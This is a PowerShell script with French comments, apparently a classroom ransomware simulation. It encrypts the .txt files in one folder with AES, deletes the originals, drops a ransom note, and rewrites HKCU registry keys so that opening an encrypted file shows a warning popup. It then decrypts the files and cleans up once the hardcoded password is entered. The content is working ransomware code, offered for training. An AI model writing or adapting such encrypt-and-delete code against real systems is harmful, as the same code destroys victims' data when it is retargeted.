$password = "TP2026"
$folder = "D:\Desktop\tp-simulation"

# --- CREATION CLE AES ---
$sha = New-Object System.Security.Cryptography.SHA256Managed
$key = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))

# --- CHIFFREMENT ---
$files = Get-ChildItem $folder -File -Filter "*.txt"

foreach ($file in $files)
{
    $data = [System.IO.File]::ReadAllBytes($file.FullName)

    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.GenerateIV()

    $encryptor = $aes.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($data, 0, $data.Length)
    $result = $aes.IV + $encryptedData

    $outputFile = $file.FullName + ".enc"
    [System.IO.File]::WriteAllBytes($outputFile, $result)

    Remove-Item $file.FullName -Force
    Write-Host "Chiffre :" $file.Name
}

# --- NOTE DE RANSON ---
$ransom = @"
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝

==========================================================
  VOS FICHIERS ONT ETE CHIFFRES - SIMULATION PEDAGOGIQUE
==========================================================

Tous vos fichiers .txt ont ete chiffres avec AES-256.
Les fichiers originaux ont ete supprimes.

Pour recuperer vos fichiers, vous devez entrer le mot de passe.

Lancez le script de dechiffrement et entrez le mot de passe.

----------------------------------------------------------
  CECI EST UNE SIMULATION - ENVIRONNEMENT DE FORMATION
----------------------------------------------------------
"@

$utf8Bom = New-Object System.Text.UTF8Encoding $true
[System.IO.File]::WriteAllText("$folder\README_DECRYPT.txt", $ransom, $utf8Bom)
Write-Host "Note de rancon creee : README_DECRYPT.txt"

# --- ASSOCIATION .enc -> POPUP (registre HKCU, sans admin) ---
$popupContent = @"
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "Ce fichier est chiffre.``n``nVeuillez lire la note de rancon :``nREADME_DECRYPT.txt",
    "Fichier Chiffre - Acces Refuse",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"@
$popupContent | Out-File "$folder\open_enc.ps1" -Encoding UTF8

New-Item -Path "HKCU:\Software\Classes\.enc" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\.enc" -Name "(Default)" -Value "EncryptedFile"

New-Item -Path "HKCU:\Software\Classes\EncryptedFile\shell\open\command" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\EncryptedFile\shell\open\command" `
    -Name "(Default)" `
    -Value "powershell.exe -WindowStyle Hidden -File `"$folder\open_enc.ps1`""

Write-Host "Association .enc configuree (popup au double-clic)"
Write-Host ""
Write-Host "Tous les fichiers sont chiffres."
Write-Host ""

# --- DEMANDE MOT DE PASSE ---
$userPassword = Read-Host "Entrer le mot de passe pour dechiffrer"

if ($userPassword -ne $password)
{
    Write-Host "Mot de passe incorrect."
    exit
}

# --- DECHIFFREMENT ---
$encryptedFiles = Get-ChildItem $folder -File -Filter "*.enc"

foreach ($encFile in $encryptedFiles)
{
    $data = [System.IO.File]::ReadAllBytes($encFile.FullName)

    $iv = $data[0..15]
    $encryptedData = $data[16..($data.Length - 1)]

    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.IV = $iv

    $decryptor = $aes.CreateDecryptor()
    $decryptedData = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)

    $originalName = $encFile.FullName -replace '\.enc$', ''
    [System.IO.File]::WriteAllBytes($originalName, $decryptedData)

    Remove-Item $encFile.FullName -Force
    Write-Host "Dechiffre :" $originalName
}

# --- NETTOYAGE ---
Remove-Item "$folder\README_DECRYPT.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$folder\open_enc.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item "HKCU:\Software\Classes\.enc" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "HKCU:\Software\Classes\EncryptedFile" -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "Tous les fichiers ont ete dechiffres et restaures."